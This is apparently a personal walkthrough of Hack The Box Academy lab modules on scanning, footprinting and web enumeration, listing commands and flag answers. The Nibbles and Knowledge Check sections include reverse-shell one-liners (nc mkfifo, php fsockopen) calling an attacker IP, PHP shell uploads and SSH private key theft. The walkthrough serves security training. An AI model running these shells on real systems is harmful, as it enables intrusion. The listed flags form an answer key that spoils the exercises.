
## [Getting Started](https://academy.hackthebox.com/module/details/77)

### Pentesting Basics

#### [Service scanning](https://academy.hackthebox.com/module/77/section/726)

**Perform an Nmap scan of the target. What does Nmap display as the version of the service running on port 8080?**

```
sudo nmap -sC -sV -p8080 $ip 
```

**Results**: Apache Tomcat



**Perform an Nmap scan of the target and identify the non-default port that the telnet service is running on.**

```
sudo nmap -sC -sV $ip
```

**Results**: 2323


**List the SMB shares available on the target host. Connect to the available share as the bob user. Once connected, access the folder called 'flag' and submit the contents of the flag.txt file.**

```
smbclient  /\/\10.129.125.178/\users -U bob
# password: Welcome1. Included in the path explanation

smb>dir
smb>cd flag
smb>get flag.txt
smb>quit
cat flag.txt
```

**Results**: dceece590f3284c3866305eb2473d099


#### [Web Enumeration](https://academy.hackthebox.com/module/77/section/728)

**Try running some of the web enumeration techniques you learned in this section on the server above, and use the info you get to get the flag.**

```
dirb http://94.237.55.246:55655/    
# From enumeration you can get to dirb http://94.237.55.246:55655/robots.txt
```

Go to http://94.237.55.246:55655/robots.txt and you will notice http://94.237.55.246:55655/admin-login-page.php

Visit it and, hardcoded in the site you will see:

```
                <!-- TODO: remove test credentials admin:password123 -->

```

Login into the app.

**Results**: HTB{w3b_3num3r4710n_r3v34l5_53cr375}There are many retired boxes on the Hack The Box platform that are great for practicing Metasploit. Some of these include, but not limited to:


#### [Public Exploits](https://academy.hackthebox.com/module/77/section/843)

Access to the web app at http://ip:36883

The title of the wordpress post is "Simple Backup Plugin 2.7.10", which is a well-known vulnerable plugin. 

```
searchsploit Simple Backup Plugin 2.7.10
```


```
----------------------------------------------------------- ---------------------------------
 Exploit Title                                             |  Path
----------------------------------------------------------- ---------------------------------
Simple Backup Plugin Python Exploit 2.7.10 - Path Traversa | php/webapps/51937.txt
----------------------------------------------------------- ---------------------------------
Shellcodes: No Results
```


```
sudo cp /usr/share/exploitdb/exploits/php/webapps/51937.txt .
mv 51937.txt 51937.py
chmod +x 51937.py
python ./51937.py http://83.136.255.162:36883/ "/flag.txt" 4
#  target_url = sys.argv[1]
#  file_name = sys.argv[2]
#  depth = int(sys.argv[3])
```


**Results**: HTB{my_f1r57_h4ck}


#### [Privilege Escalation](https://academy.hackthebox.com/module/77/section/844)

**SSH to $ip with user "user1" and password "password1". SSH into the server above with the provided credentials, and use the '-p xxxxxx' to specify the port shown above. Once you login, try to find a way to move to 'user2', to get the flag in '/home/user2/flag.txt'.**

```
ssh user1@$ip -p 31459
# password1

sudo -l
# User user1 may run the following commands on
#        ng-644144-gettingstartedprivesc-udbk3-5969ffb656-cp248:
#    (user2 : user2) NOPASSWD: /bin/bash

# One way: 
echo #!/bin/bash > lala.sh
echo cat /home/user2/flag.txt >> lala.sh
chmod +x lala.sh
sudo -u user2  /bin/bash lala.sh

# Another
sudo -u user2 /bin/bash -i
```


**Results**:  HTB{l473r4l_m0v3m3n7_70_4n07h3r_u53r}


**Once you gain access to 'user2', try to find a way to escalate your privileges to root, to get the flag in '/root/flag.txt'.**

Once you are user2, go to /root:

```
cd /root
ls -la
```


```
drwxr-x--- 1 root user2 4096 Feb 12  2021 .
drwxr-xr-x 1 root root  4096 Jun  3 19:21 ..
-rwxr-x--- 1 root user2    5 Aug 19  2020 .bash_history
-rwxr-x--- 1 root user2 3106 Dec  5  2019 .bashrc
-rwxr-x--- 1 root user2  161 Dec  5  2019 .profile
drwxr-x--- 1 root user2 4096 Feb 12  2021 .ssh
-rwxr-x--- 1 root user2 1309 Aug 19  2020 .viminfo
-rw------- 1 root root    33 Feb 12  2021 flag.txt

```

So we have read access in .ssh folder. We can access and copy the private key 

```
cd .ssh
cat id_rsa
```

```
-----BEGIN OPENSSH PRIVATE KEY-----
b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAABlwAAAAdzc2gtcn
....
QfPM8OxSjcVJCpAAAAEXJvb3RANzZkOTFmZTVjMjcwAQ==
-----END OPENSSH PRIVATE KEY-----
```

In our attacker machine we save that id_rsa key in our folder

```
echo "the key" > id_rsa
```

And now we can login as root

```
ssh root@$ip -p 31459 -i id_rsa
```

And cat the flag:

```
cat /root/flag.txt 
```



**Results**:  HTB{pr1v1l363_35c4l4710n_2_r007}


### Attacking your first box

#### Nibbles - Enumeration

 **Run an nmap script scan on the target. What is the Apache version running on the server? (answer format: X.X.XX)**


```
sudo nmap -sC -sV $ip
```

**Results**:  2.4.18


#### [Nibbles - Initial Foothold](https://academy.hackthebox.com/module/77/section/852)

**Gain a foothold on the target and submit the user.txt flag**

Enumerate resources


```
ffuf -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -u http://$ip/nibbleblog/FUZZ -H "HOST: $ip$"

dirb http://$ip/nibbleblog/
```

There are a lot of directory listing enabled. And eventually we can browser to:
http://$ip/nibbleblog/content/private/users.xml

We can identify the user admin.

![admin user](img/htb-nibble_00.png)

We could also enumerate http://$ip/nibbleblog/admin.php

Login access is admin:nibbles.

Go to Plugins tab and locate MyImage one: http://$ip/nibbleblog/admin.php?controller=plugins&action=config&plugin=my_image

Upload a PHP reverse shell, go to http://$IP/nibbleblog/content/private/plugins/my_image/ 

Set a netcat listener

```
nc -lnvp 1234
```

Click on the reverse shell "image.php" and we will get a reverse shell.

```
whoami
#nibbler

cat /home/nibbler/user.txt
```



**Results**:  79c03865431abf47b90ef24b9695e14879c03865431abf47b90ef24b9695e148


#### [Nibbles - Privilege Escalation](https://academy.hackthebox.com/module/77/section/853)

Escalate privileges and submit the root.txt flag.

```
cd /home/nibbler
```


```
sudo -l
```

Results:

```
Matching Defaults entries for nibbler on Nibbles:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User nibbler may run the following commands on Nibbles:
    (root) NOPASSWD: /home/nibbler/personal/stuff/monitor.sh
```

The `nibbler` user can run the file `/home/nibbler/personal/stuff/monitor.sh` with root privileges. Being that we have full control over that file, if we append a reverse shell one-liner to the end of it and execute with `sudo` we should get a reverse shell back as the root user.

```
unzip personal.zip
strings /home/nibbler/personal/stuff/monitor.sh
```


```
echo 'rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc $IPattacker 8443 >/tmp/f' | tee -a monitor.sh
```

In the attacker machine, open a new netcat:

```
nc -lnvp 8443
```

Run monitor.sh with sudo

```
sudo ./monitor.sh
```

In the new netcat connection you are root.

```
cat /root/root.txt
```


**Results**: de5e5d6619862a8aa5b9b212314e0cdd


Alternative way: Metasploit 

```shell-session
exploit/multi/http/nibbleblog_file_upload
```


### [Knowledge Check](https://academy.hackthebox.com/module/77/section/859)

**Spawn the target, gain a foothold and submit the contents of the user.txt flag.**

```
sudo nmap -sC -sV $ip
```

Go to http://$ip/robots.txt

Go to http://$ip/admin

Enter admin:admin

Go to Edit Theme: http://$ip/admin/theme-edit.php

Add a pentesmonkey shell and set a netcat listener on port 1234

Add gettingstarte.htb to your hosts file

Open the blog and you will get a reverse shell

```
cat /home/mrb3n/user.txt
```

**Results**: 7002d65b149b0a4d19132a66feed21d8


**After obtaining a foothold on the target, escalate privileges to root and submit the contents of the root.txt flag.**

Check out our permissions

```
sudo -l
```

Results:

```
Matching Defaults entries for www-data on gettingstarted:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User www-data may run the following commands on gettingstarted:
    (ALL : ALL) NOPASSWD: /usr/bin/php

```

Grab a simple php reverse shell such as:

```
php -r '$sock=fsockopen("$AttackerIP",4444);exec("/bin/sh <&3 >&3 2>&3");'
```

Set up a netcat listener on port 4444:

```
nc -lnvp
```


Run as sudo:

```
sudo /usr/bin/php -r '$sock=fsockopen("$AttackerIP",4444);exec("/bin/sh <&3 >&3 2>&3");
```

You are root in the listener. Now

```
cat /root/root.txt
```

**Results**: f1fba6e9f71efb2630e6e34da6387842



## [Network Enumeration with Nmap](https://academy.hackthebox.com/module/details/19)

### Host Enumeration

#### [Host Discovery](https://academy.hackthebox.com/module/19/section/101)

**Based on the last result, find out which operating system it belongs to. Submit the name of the operating system as result.**


```
sudo nmap $ip -sn -oA host -PE --packet-trace --disable-arp-ping 
```

**Result**: Windows

#### [Host and Port Scanning](https://academy.hackthebox.com/module/19/section/102)


**Find all TCP ports on your target. Submit the total number of found TCP ports as the answer.**

```
nmap $ip
```

**Results**: 7


**Enumerate the hostname of your target and submit it as the answer. (case-sensitive):**

```
sudo nmap $ip -Pn -sC -sV -p22,80,110,139,143,445,31337
```

**Results**: nix-nmap-default


#### [Saving the Results](https://academy.hackthebox.com/module/19/section/104)

 Perform a full TCP port scan on your target and create an HTML report. Submit the number of the highest port as the answer.

```
nmap $ip
```

Results: 31337


#### [Service Enumeration](https://academy.hackthebox.com/module/19/section/103)

Enumerate all ports and their services. One of the services contains the flag you have to submit as the answer.

```
sudo nmap $ip -Pn -sC -sV -p22,80,110,139,143,445,31337
```

Results: HTB{pr0F7pDv3r510nb4nn3r}


#### [Nmap Scripting Engine](https://academy.hackthebox.com/module/19/section/108)

**Use NSE and its scripts to find the flag that one of the services contain and submit it as the answer.**

```
sudo nmap $ip -p80 --script vuln
```

Result:

```
Pre-scan script results:
| broadcast-avahi-dos: 
|   Discovered hosts:
|     224.0.0.251
|   After NULL UDP avahi packet DoS (CVE-2011-1002).
|_  Hosts are all up (not vulnerable).
Nmap scan report for 10.129.68.164
Host is up (0.047s latency).

PORT   STATE SERVICE
80/tcp open  http
|_http-csrf: Couldn't find any CSRF vulnerabilities.
|_http-dombased-xss: Couldn't find any DOM based XSS.
|_http-stored-xss: Couldn't find any stored XSS vulnerabilities.
| http-enum: 
|_  /robots.txt: Robots file
```

Go to robots.txt and get the flag.

Results: HTB{873nniuc71bu6usbs1i96as6dsv26}


### Bypass Security Measures


#### [Firewall and IDS/IPS Evasion - Easy Lab](https://academy.hackthebox.com/module/19/section/117)

Our client wants to know if we can identify which operating system their provided machine is running on. Submit the OS name as the answer.

```
sudo nmap -sC -sV $ip -p80  -Pn --max-retries 3 --initial-rtt-timeout 50ms --max-rtt-timeout 100ms
```

Results: Ubuntu



#### [Firewall and IDS/IPS Evasion - Medium Lab](https://academy.hackthebox.com/module/19/section/118)

After the configurations are transferred to the system, our client wants to know if it is possible to find out our target's DNS server version. Submit the DNS server version of the target as the answer.

```
sudo nmap -sU -p53 --script dns-nsid $ip 
```

Results: HTB{GoTtgUnyze9Psw4vGjcuMpHRp}


#### [Firewall and IDS/IPS Evasion - Hard Lab](https://academy.hackthebox.com/module/19/section/119)

 Now our client wants to know if it is possible to find out the version of the running services. Identify the version of service our client was talking about and submit the flag as the answer.

```
sudo nc -nv -p 53 $ip  50000 
```


Results: HTB{kjnsdf2n982n1827eh76238s98di1w6}



## [Footprinting](https://academy.hackthebox.com/module/details/112)

### Host Based Enumeration

#### FTP

**Which version of the FTP server is running on the target system? Submit the entire banner as the answer.**

```
nc -nv $ip 21
```

Results: InFreight FTP v1.1


Enumerate the FTP server and find the flag.txt file. Submit the contents of it as the answer.

```
ftp $ip
```

Enter user anonymous.

Enter password anonymous.

```
ftp> dir
ftp> get flag.txt
ftp> quit

cat flag.
```

Results: HTB{b7skjr4c76zhsds7fzhd4k3ujg7nhdjre}


#### SMB

**What version of the SMB server is running on the target system? Submit the entire banner as the answer.**

```
sudo nmap $ip  -p445 -sV -A -sC
```

Results: Samba smbd 4.6.2


 **What is the name of the accessible share on the target?**

```
 smbclient  -L //$ip 
```

Results: sambashare


**Connect to the discovered share and find the flag.txt file. Submit the contents as the answer.**

```
smbclient  //$ip/sambashare -U ""
dir
cd contents
ls
get flag.txt
quit
cat flag.txt
```

Results: HTB{o873nz4xdo873n4zo873zn4fksuhldsf}


**Find out which domain the server belongs to.**

```
rpcclient -U "" $ip
rpcclient $> querydominfo
```

Results: DEVOPS

**Find additional information about the specific share we found previously and submit the customized version of that specific share as the answer.**

```
rpcclient $> netsharegetinfo sambashare
```

Results: InFreight SMB v3.1



**What is the full system path of that specific share? (format: "/directory/names")**

```
rpcclient $> netsharegetinfo sambashare
```

Results: /home/sambauser


#### NFS

**Enumerate the NFS service and submit the contents of the flag.txt in the "nfs" share as the answer.**

```
sudo nmap $ip -p111,2049 -sV -sC
showmount -e $ip 
mkdir target 
sudo mount -t nfs $ip:/ ./target -o nolock
cd target 
tree .
cat var/nfs/flag.txt 
```

Results: HTB{hjglmvtkjhlkfuhgi734zthrie7rjmdze}

**Enumerate the NFS service and submit the contents of the flag.txt in the "nfsshare" share as the answer.**

```
cat mnt/nfsshare/flag.txt 
```

Results: HTB{8o7435zhtuih7fztdrzuhdhkfjcn7ghi4357ndcthzuc7rtfghu34}


#### DNS

**Interact with the target DNS using its IP address and enumerate the FQDN of it for the "inlanefreight.htb" domain.**


```
dig any inlanefreight.htb @$ip
```

Result: 
ns.inlanefreight.htb



**Identify if its possible to perform a zone transfer and submit the TXT record as the answer. (Format: HTB{...))**

```
#First, we do an initial transfer zone
dig axfr inlanefreight.htb @$ip
```

Results:

```

; <<>> DiG 9.19.21-1-Debian <<>> axfr inlanefreight.htb @10.129.218.112
;; global options: +cmd
inlanefreight.htb.	604800	IN	SOA	inlanefreight.htb. root.inlanefreight.htb. 2 604800 86400 2419200 604800
inlanefreight.htb.	604800	IN	TXT	"MS=ms97310371"
inlanefreight.htb.	604800	IN	TXT	"atlassian-domain-verification=t1rKCy68JFszSdCKVpw64A1QksWdXuYFUeSXKU"
inlanefreight.htb.	604800	IN	TXT	"v=spf1 include:mailgun.org include:_spf.google.com include:spf.protection.outlook.com include:_spf.atlassian.net ip4:10.129.124.8 ip4:10.129.127.2 ip4:10.129.42.106 ~all"
inlanefreight.htb.	604800	IN	NS	ns.inlanefreight.htb.
app.inlanefreight.htb.	604800	IN	A	10.129.18.15
dev.inlanefreight.htb.	604800	IN	A	10.12.0.1
internal.inlanefreight.htb. 604800 IN	A	10.129.1.6
mail1.inlanefreight.htb. 604800	IN	A	10.129.18.201
ns.inlanefreight.htb.	604800	IN	A	127.0.0.1
inlanefreight.htb.	604800	IN	SOA	inlanefreight.htb. root.inlanefreight.htb. 2 604800 86400 2419200 604800
;; Query time: 44 msec
;; SERVER: 10.129.218.112#53(10.129.218.112) (TCP)
;; WHEN: Wed Jul 31 13:57:45 EDT 2024
;; XFR size: 11 records (messages 1, bytes 560)

```


 With the result, now we can do a second transfer zone

```
dig axfr internal.inlanefreight.htb @$ip
```


Results:

```
; <<>> DiG 9.19.21-1-Debian <<>> axfr internal.inlanefreight.htb @10.129.218.112
;; global options: +cmd
internal.inlanefreight.htb. 604800 IN	SOA	inlanefreight.htb. root.inlanefreight.htb. 2 604800 86400 2419200 604800
internal.inlanefreight.htb. 604800 IN	TXT	"MS=ms97310371"
internal.inlanefreight.htb. 604800 IN	TXT	"HTB{DN5_z0N3_7r4N5F3r_iskdufhcnlu34}"
internal.inlanefreight.htb. 604800 IN	TXT	"atlassian-domain-verification=t1rKCy68JFszSdCKVpw64A1QksWdXuYFUeSXKU"
internal.inlanefreight.htb. 604800 IN	TXT	"v=spf1 include:mailgun.org include:_spf.google.com include:spf.protection.outlook.com include:_spf.atlassian.net ip4:10.129.124.8 ip4:10.129.127.2 ip4:10.129.42.106 ~all"
internal.inlanefreight.htb. 604800 IN	NS	ns.inlanefreight.htb.
dc1.internal.inlanefreight.htb.	604800 IN A	10.129.34.16
dc2.internal.inlanefreight.htb.	604800 IN A	10.129.34.11
mail1.internal.inlanefreight.htb. 604800 IN A	10.129.18.200
ns.internal.inlanefreight.htb. 604800 IN A	127.0.0.1
vpn.internal.inlanefreight.htb.	604800 IN A	10.129.1.6
ws1.internal.inlanefreight.htb.	604800 IN A	10.129.1.34
ws2.internal.inlanefreight.htb.	604800 IN A	10.129.1.35
wsus.internal.inlanefreight.htb. 604800	IN A	10.129.18.2
internal.inlanefreight.htb. 604800 IN	SOA	inlanefreight.htb. root.inlanefreight.htb. 2 604800 86400 2419200 604800
;; Query time: 44 msec
;; SERVER: 10.129.218.112#53(10.129.218.112) (TCP)
;; WHEN: Wed Jul 31 13:58:29 EDT 2024
;; XFR size: 15 records (messages 1, bytes 677)
```

Then: HTB{DN5_z0N3_7r4N5F3r_iskdufhcnlu34}


**What is the IPv4 address of the hostname DC1?**

Get the answer from the response to the previous question. In this case: 10.129.34.16


What is the FQDN of the host where the last octet ends with "x.x.x.203"?

```
dnsenum --dnsserver 10.129.218.112 --enum -p 0 -s 0 -o subdomains.txt -f /usr/share/seclists/Discovery/DNS/fierce-hostlist.txt dev.inlanefreight.htb
```

Results:

```
-----   dev.inlanefreight.htb   -----


Host's addresses:
__________________



Name Servers:
______________

ns.inlanefreight.htb.                    604800   IN    A         127.0.0.1


Mail (MX) Servers:
___________________



Trying Zone Transfers and getting Bind Versions:
_________________________________________________

unresolvable name: ns.inlanefreight.htb at /usr/bin/dnsenum line 892 thread 2.

Trying Zone Transfer for dev.inlanefreight.htb on ns.inlanefreight.htb ... 
AXFR record query failed: no nameservers


Brute forcing with /usr/share/seclists/Discovery/DNS/fierce-hostlist.txt:
__________________________________________________________________________

dev1.dev.inlanefreight.htb.              604800   IN    A         10.12.3.6
ns.dev.inlanefreight.htb.                604800   IN    A         127.0.0.1
win2k.dev.inlanefreight.htb.             604800   IN    A        10.12.3.203

```

Therefore: win2k.dev.inlanefreight.htb

#### SMTP

**Enumerate the SMTP service and submit the banner, including its version as the answer.**

```
sudo nmap $ip -sC -sV -p25
```


Results: InFreight ESMTP v2.11


**Enumerate the SMTP service even further and find the username that exists on the system. Submit it as the answer.**

```
for user in $(cat ~/Downloads/footprintingusers.txt); do echo VRFY $user | nc -nv -w 6 $ip 25  ; done
```

Results: robin


#### IMAP / POP3

**Figure out the exact organization name from the IMAP/POP3 service and submit it as the answer.**

```
sudo nmap $ip -sV -p110,143,993,995 -sC
```

Results: InlaneFreight Ltd

**What is the FQDN that the IMAP and POP3 servers are assigned to?**

```
sudo nmap $ip -sV -p110,143,993,995 -sC
```

Results: dev.inlanefreight.htb


**Enumerate the IMAP service and submit the flag as the answer. (Format: HTB{...})**

```
echo $ip inlanefreight.htb dev.inlanefreight.htb >> /etc/hosts
curl -k 'imaps://dev.inlanefreight.htb' --user robin:robin -v
```

```
* Host dev.inlanefreight.htb:993 was resolved.
* IPv6: (none)
* IPv4: 10.129.42.195
*   Trying 10.129.42.195:993...
* Connected to dev.inlanefreight.htb (10.129.42.195) port 993
* TLSv1.3 (OUT), TLS handshake, Client hello (1):
* TLSv1.3 (IN), TLS handshake, Server hello (2):
* TLSv1.3 (IN), TLS handshake, Encrypted Extensions (8):
* TLSv1.3 (IN), TLS handshake, Certificate (11):
* TLSv1.3 (IN), TLS handshake, CERT verify (15):
* TLSv1.3 (IN), TLS handshake, Finished (20):
* TLSv1.3 (OUT), TLS change cipher, Change cipher spec (1):
* TLSv1.3 (OUT), TLS handshake, Finished (20):
* SSL connection using TLSv1.3 / TLS_AES_256_GCM_SHA384 / x25519 / RSASSA-PSS
* Server certificate:
*  subject: C=UK; ST=London; L=London; O=InlaneFreight Ltd; OU=DevOps Dep�artment; CN=dev.inlanefreight.htb; emailAddress=cto.dev@dev.inlanefreight.htb
*  start date: Nov  8 23:10:05 2021 GMT
*  expire date: Aug 23 23:10:05 2295 GMT
*  issuer: C=UK; ST=London; L=London; O=InlaneFreight Ltd; OU=DevOps Dep�artment; CN=dev.inlanefreight.htb; emailAddress=cto.dev@dev.inlanefreight.htb
*  SSL certificate verify result: self-signed certificate (18), continuing anyway.
*   Certificate level 0: Public key type RSA (2048/112 Bits/secBits), signed using sha256WithRSAEncryption
* TLSv1.3 (IN), TLS handshake, Newsession Ticket (4):
* TLSv1.3 (IN), TLS handshake, Newsession Ticket (4):
* old SSL session ID is stale, removing
< * OK [CAPABILITY IMAP4rev1 SASL-IR LOGIN-REFERRALS ID ENABLE IDLE LITERAL+ AUTH=PLAIN] HTB{roncfbw7iszerd7shni7jr2343zhrj}
> A001 CAPABILITY
< * CAPABILITY IMAP4rev1 SASL-IR LOGIN-REFERRALS ID ENABLE IDLE LITERAL+ AUTH=PLAIN
< A001 OK Pre-login capabilities listed, post-login capabilities have more.
> A002 AUTHENTICATE PLAIN AHJvYmluAHJvYmlu
< * CAPABILITY IMAP4rev1 SASL-IR LOGIN-REFERRALS ID ENABLE IDLE SORT SORT=DISPLAY THREAD=REFERENCES THREAD=REFS THREAD=ORDEREDSUBJECT MULTIAPPEND URL-PARTIAL CATENATE UNSELECT CHILDREN NAMESPACE UIDPLUS LIST-EXTENDED I18NLEVEL=1 CONDSTORE QRESYNC ESEARCH ESORT SEARCHRES WITHIN CONTEXT=SEARCH LIST-STATUS BINARY MOVE SNIPPET=FUZZY PREVIEW=FUZZY LITERAL+ NOTIFY SPECIAL-USE
< A002 OK Logged in
> A003 LIST "" *
< * LIST (\Noselect \HasChildren) "." DEV
* LIST (\Noselect \HasChildren) "." DEV
< * LIST (\Noselect \HasChildren) "." DEV.DEPARTMENT
* LIST (\Noselect \HasChildren) "." DEV.DEPARTMENT
< * LIST (\HasNoChildren) "." DEV.DEPARTMENT.INT
* LIST (\HasNoChildren) "." DEV.DEPARTMENT.INT
< * LIST (\HasNoChildren) "." INBOX
* LIST (\HasNoChildren) "." INBOX
< A003 OK List completed (0.009 + 0.000 + 0.008 secs).
* Connection #0 to host dev.inlanefreight.htb left intact

```

Results: HTB{roncfbw7iszerd7shni7jr2343zhrj}

**What is the customized version of the POP3 server?**

```
openssl s_client -connect $ip:pop3s
```

Results: InFreight POP3 v9.188


**What is the admin email address?**

```
# Establish a imap connection
openssl s_client -connect $ip:imaps

# Login as user robin with password robin
a LOGIN robin robin

# List inboxes
a LIST "" *

# Select one of them
a SELECT DEV.DEPARTMENT.INT

# Retrieves the messages by ID
a FETCH 1 all

```

Results: devadmin@inlanefreight.htb


 **Try to access the emails on the IMAP server and submit the flag as the answer. (Format: HTB{...})**

```
# Establish a imap connection
openssl s_client -connect $ip:imaps

# Login as user robin with password robin
a LOGIN robin robin

# List inboxes
a LIST "" *

# Select one of them
a SELECT DEV.DEPARTMENT.INT

# Retrieve the messages by ID
a FETCH 1 all

# Retrieve the content of the message with id 1
a FETCH 1 BODY.PEEK[TEXT]
```

Results:  HTB{983uzn8jmfgpd8jmof8c34n7zio}

#### SNMP

**Enumerate the SNMP service and obtain the email address of the admin. Submit it as the answer.**

```
snmpwalk -v2c -c public $ip
```

Results: devadmin@inlanefreight.htb

**What is the customized version of the SNMP server?**

```
snmpwalk -v2c -c public $ip
```

Results: InFreight SNMP v0.91


 **Enumerate the custom script that is running on the system and submit its output as the answer.**

```
snmpwalk -v2c -c public $ip
```

Results: HTB{5nMp_fl4g_uidhfljnsldiuhbfsdij44738b2u763g}

#### MySQL


**Enumerate the MySQL server and determine the version in use. (Format: MySQL X.X.XX)**

```
sudo nmap -sS -sV --script mysql-empty-password -p 3306 $ip -Pn
```

Results: MySQL 8.0.27


**During our penetration test, we found weak credentials "robin:robin". We should try these against the MySQL server. What is the email address of the customer "Otto Lang"?**

```
mysql -u robin -probin -h $ip
select * from customers.myTable where name LIKE "Otto Lang";
```


Results: ultrices@google.htb

#### MSSQL

**Enumerate the target using the concepts taught in this section. List the hostname of MSSQL server.**

```
nmap --script ms-sql-info,ms-sql-empty-password,ms-sql-xp-cmdshell,ms-sql-config,ms-sql-ntlm-info,ms-sql-tables,ms-sql-hasdbaccess,ms-sql-dac,ms-sql-dump-hashes --script-args mssql.instance-port=1433,mssql.username=sa,mssql.password=,mssql.instance-name=MSSQLSERVER -sV -p 1433 $ip
```

Results: ILF-SQL-01


**Connect to the MSSQL instance running on the target using the account (backdoor:Password1), then list the non-default database present on the server.**

```
mssqlclient.py backdoor@$ip -windows-auth -p 1433

SELECT name FROM master.dbo.sysdatabases

```

Results: Employees

#### Oracle TNS

Enumerate the target Oracle database and submit the password hash of the user DBSNMP as the answer.

```
python3 ./odat.py all -s $ip
# With this we obtain the creds scott/tiger

# Now we connect to the database
sqlplus scott/tiger@$ip/XE as sysdba

# Extract Password Hashes
select name, password from sys.user$;
```

Results: E066D214D5421CCC

#### IPMI

**What username is configured for accessing the host via IPMI?**

```
sudo msfdb init
msfconsole -q
use auxiliary/scanner/ipmi/ipmi_dumphashes
setg RHOSTS $ip
run
```

Results: admin

**What is the account's cleartext password?**

```
sudo msfdb init
msfconsole -q
use auxiliary/scanner/ipmi/ipmi_dumphashes
set PASS_FILE /usr/share/wordlists/rockyou.txt
run
```

Results: trinity


### Skills assessment

#### Footprinting Lab - Easy

We were commissioned by the company `Inlanefreight Ltd` to test three different servers in their internal network. The company uses many different services, and the IT security department felt that a penetration test was necessary to gain insight into their overall security posture. The first server is an internal DNS server that needs to be investigated. In particular, our client wants to know what information we can get out of these services and how this information could be used against its infrastructure. Our goal is to gather as much information as possible about the server and find ways to use that information against the company. However, our client has made it clear that it is forbidden to attack the services aggressively using exploits, as these services are in production. Additionally, our teammates have found the following credentials "ceil:qwer1234", and they pointed out that some of the company's employees were talking about SSH keys on a forum. The administrators have stored a `flag.txt` file on this server to track our progress and measure success. Fully enumerate the target and submit the contents of this file as proof.

**Enumerate the server carefully and find the flag.txt file. Submit the contents of this file as the answer.**

```
ftp $ip -p 2121
# enter user `ceil` and password `qwer1234`

ls -la
cd .ssh
get id_rsa ~/.ssh/
quit

chmod 600 ~/.ssh/id_rsa
ssh -i ~/.ssh/id_rsa ceil@$ip
find / -name flag.txt 2>/dev/null
cat /home/flag/flag.txt
```

Results:  HTB{7nrzise7hednrxihskjed7nzrgkweunj47zngrhdbkjhgdfbjkc7hgj}


#### Footprinting Lab - Medium

This second server is a server that everyone on the internal network has access to. In our discussion with our client, we pointed out that these servers are often one of the main targets for attackers and that this server should be added to the scope. Our customer agreed to this and added this server to our scope. Here, too, the goal remains the same. We need to find out as much information as possible about this server and find ways to use it against the server itself. For the proof and protection of customer data, a user named `HTB` has been created. Accordingly, we need to obtain the credentials of this user as proof.

**Enumerate the server carefully and find the username "HTB" and its password. Then, submit this user's password as the answer.**

```
sudo nmap -sS -sV -top-ports 4000 $ip

# We will attack firts service 2049
showmount -e $ip
mkdir target-NFS
sudo mount -t nfs $ip:/ ./target-NFS/ -o nolock
cd target-NFS

sudo ls -la
sudo ls -la TechSupport
sudo cat TechSupport/ticket4238791283782.txt
```

Credentials are obtained for accessing a different service:

```
 5    user="alex"
 6    password="lol123!mD"
```


```
# Now we connect to 3389 RDP:
xfreerdp /cert:ignore /u:alex /p:"lol123\!mD" /v:$ip
```

A Windows connection opens up.

We browse the machine and find `C:\Users\alex\devshare\important` file, that contains the following creds:

```
sa:87N1ns@slls83
```

Right click on Microsoft SQL Server Management Studio and select "Execute as Administrator". Enter the creds `87N1ns@slls83`. Now we connect to the server:

![sql](img/htb-academy-footprinting-module_00.png) 

Browse around, but the final SQL query would be

```MSSQL
SELECT TOP (1000) [id]
      ,[name]
      ,[password]
  FROM [accounts].[dbo].[devsacc]
```

Results: lnch7ehrdn43i7AoqVPK4zWR

#### Footprinting Lab - Hard

The third server is an MX and management server for the internal network. Subsequently, this server has the function of a backup server for the internal accounts in the domain. Accordingly, a user named `HTB` was also created here, whose credentials we need to access.

**Enumerate the server carefully and find the username "HTB" and its password. Then, submit HTB's password as the answer.**

```
# Enumerate TCP and UDP
sudo nmap -sS -sV -top-ports 4000 $ip
sudo nmap $ip -sU   
```

```
PORT    STATE SERVICE  VERSION
22/tcp  open  ssh      OpenSSH 8.2p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
110/tcp open  pop3     Dovecot pop3d
143/tcp open  imap     Dovecot imapd (Ubuntu)
993/tcp open  ssl/imap Dovecot imapd (Ubuntu)
995/tcp open  ssl/pop3 Dovecot pop3d
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```


```
PORT    STATE         SERVICE
68/udp  open|filtered dhcpc
161/udp open          snmp
```

We start with SNMP vulnerabilities:

```
onesixtyone -c /usr/share/seclists/Discovery/SNMP/snmp.txt $ip
```

In the result, you can spot the `community string` `backup`. Now, we can use braa:

```
braa backup@$ip:.1.3.6.* 
```

In the results a credential is showed:

```
tom NMds732Js2761
```

We use that credential to login into the IMAP server:

```
openssl s_client -connect $ip:imaps

a LOGIN tom NMds732Js2761

a SELECT INBOX
a FETCH 1 all
a FETCH 1 BODY.PEEK[TEXT]
```

And we obtain a OPENSSH PRIVATE KEY that we save into our ~/.ssh folder. We give 600 permission to the file id_rsa.

```
chmod 600 id_rsa
ssh tom@$ip
```

Now, we are in. I had a look at the history file and saw a MySQL connection:

```
history
```

I decided to have a look at it:

```
mysql -u tom -p

#Enter the password NMds732Js2761
```

```
show databases;
use users;
show tables;
select * from users;
```


Results: cr3n4o7rzse7rzhnckhssncif7ds



## [Information Gathering - Web Edition](https://academy.hackthebox.com/module/details/144)


### WHOIS

#### Utilizing WHOIS

**Perform a WHOIS lookup against the paypal.com domain. What is the registrar Internet Assigned Numbers Authority (IANA) ID number?**

```
whoid paypal.com
```

Results: 292

**What is the admin email contact for the tesla.com domain (also in-scope for the Tesla bug bounty program)?**

```
whoid tesla.com
```

Results: admin@dnstinations.com



### DNS & Subdomains

#### Digging DNS


**Which IP address maps to inlanefreight.com?**

```
dig +short inlanefreight.com
```

Results: 134.209.24.248



**Which domain is returned when querying the PTR record for 134.209.24.248?**

```
dig -x 134.209.24.248 @1.1.1.1
```

Results:  inlanefreight.com

What is the full domain returned when you query the mail records for facebook.com?

```
dig MX facebook.com
```

Results: smtpin.vvv.facebook.com
#### Subdomain BruteForcing

